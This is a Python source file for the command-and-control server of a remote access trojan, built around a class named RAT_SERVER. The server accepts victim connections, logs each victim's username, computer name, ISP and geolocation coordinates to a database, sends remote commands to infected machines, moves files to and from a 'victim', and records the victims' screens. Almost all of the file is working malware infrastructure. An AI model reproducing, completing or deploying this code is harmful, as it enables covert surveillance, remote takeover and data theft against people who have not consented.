from fastapi import UploadFile
import socket
import select
import threading
import time
import uuid

from host.service.socket_builder import SocketBuilder
from host.modules.screenshare import ScreenShareManager
from host.service.utilities import gatherInfoOutput, executeCommands
from host.service.classManager import SingletonMeta
from host.modules.filetransfer import FileTransferManager
from database.clients import get_client_by_socket_ip, add_client, edit_clients, edit_client


class RAT_SERVER(metaclass=SingletonMeta):
    instance = None

    def __init__(self, host, port):
        if not RAT_SERVER.instance:
            RAT_SERVER.instance = self
            self.host = host
            self.port = port
            self.clients = []

            self.file_manager = FileTransferManager(
                "localhost", 4440, "localhost", 4441)
            self.file_upload_thread = threading.Thread(
                target=self.file_manager.start_upload_server)
            self.file_upload_thread.start()
            self.file_download_thread = threading.Thread(
                target=self.file_manager.start_download_server)
            self.file_download_thread.start()

            self.screen_share_manager = ScreenShareManager(
                "localhost", 8095)

            self.screen_share_thread = threading.Thread(
                target=self.screen_share_manager.connect)
            self.screen_share_thread.start()

            # self.disconnection_thread = threading.Thread(
            #     target=self.check_client_disconnection)
            # self.disconnection_thread.daemon = True
            # self.disconnection_thread.start()

    def build_connection(self):
        server_socket = SocketBuilder.build_server_socket(
            self.host, self.port)

        print("[*] Waiting for clients...")

        while True:
            try:
                client, addr = server_socket.accept()
                print("Clients ->", self.clients)
                self.clients.append((client, addr))
                print(f"[*] Connection established with {addr[0]}")

                output = self.receive_output(addr[0])
                output = gatherInfoOutput(output)
                if output is None:
                    continue

                try:
                    if not get_client_by_socket_ip(addr[0]):
                        random_uuid = str(uuid.uuid4().hex)
                        directory = f"data/{output['System Info']['ComputerName']}/screenshare/{random_uuid}/"

                        output["SCREENSHARE_SOURCE"] = f"{directory}video.avi"
                        self.add_client_to_db(output, addr)
                        print("Added client to database")
                except Exception as e:
                    random_uuid = str(uuid.uuid4().hex)
                    directory = f"data/{output['System Info']['ComputerName']}/screenshare/{random_uuid}/"

                    output["SCREENSHARE_SOURCE"] = f"{directory}video.avi"
                    self.add_client_to_db(output, addr)

                    print(f"Error getting client by socket ip: {str(e)}")

                edit_client(get_client_by_socket_ip(
                    addr[0])[0].id, "status", "Online")
            except Exception as e:
                print(f"Error building connection: {str(e)}")
                for client in self.clients:
                    print(client[1][0])
                    if client[1][0] == addr[0]:
                        self.clients.remove(client)
                        print(f"[*] Client {addr[0]} disconnected")
                        try:
                            client_socket_ip = addr[0]
                            client_id = get_client_by_socket_ip(
                                client_socket_ip)[0].id
                            edit_client(client_id, "status", "Offline")
                        except Exception as e:
                            print(
                                f"Error updating client status: {str(e)}")
                        break

    def receive_output(self, socket_ip):
        for client in self.clients:
            if client[1][0] == socket_ip:
                client_socket = client[0]
                break
        try:
            print("Receiving output")
            ready = select.select([client_socket], [], [], 5)

            if ready[0]:
                try:
                    decoded = client_socket.recv(100024).decode()
                    return decoded
                except:
                    return "Error decoding output"
            else:
                return "Error receiving output"
        except Exception as e:
            print(f"Error receiving output: {str(e)}")

    def execute(self, command_type, command, socket_ip):
        client_socket = None
        for client in self.clients:
            if client[1][0] == socket_ip:
                client_socket = client[0]
                break

        if client_socket is None:
            return "Error executing command"
        executeCommands(command_type, command, client_socket)

    async def transfer_file(self, victim, file: UploadFile):
        await self.file_manager.upload_file(victim, file)

    def check_client_disconnection(self):
        while True:
            disconnected_clients = []

            for client, addr in self.clients:
                try:
                    ready = select.select([client], [], [], 0.1)
                    if not ready[0]:
                        disconnected_clients.append((client, addr))
                except Exception as e:
                    print(f"Error checking client status: {str(e)}")

            for client, addr in disconnected_clients:
                self.clients.remove((client, addr))
                print(f"[*] Client {addr[0]} disconnected")
                try:
                    client_socket_ip = addr[0]
                    client_id = get_client_by_socket_ip(client_socket_ip)[0].id
                    edit_client(client_id, "status", "Offline")
                except Exception as e:
                    print(f"Error updating client status: {str(e)}")

            time.sleep(15)  # Check for disconnections every 5 seconds

    def add_client_to_db(self, output, addr):
        add_client(output["System Info"]["IPv4"], "Online", output['System Info']['ComputerName'], output['System Info']["OS"], output['System Info']["Architecture"], output['System Info']["Username"], output['System Info']["Country"], output['System Info']["City"], output['System Info']["Location"]["Latitude"], output['System Info']["Location"]["Longitude"],
                   output['System Info']["ISP"], output['System Info']["Timezone"], output['System Info']["Organization"], output['System Info']["Postal"], output['System Info']["ConnectionType"], output['System Info']["Region"], output['System Info']["RegionName"], output["SCREENSHARE_SOURCE"], addr[0])
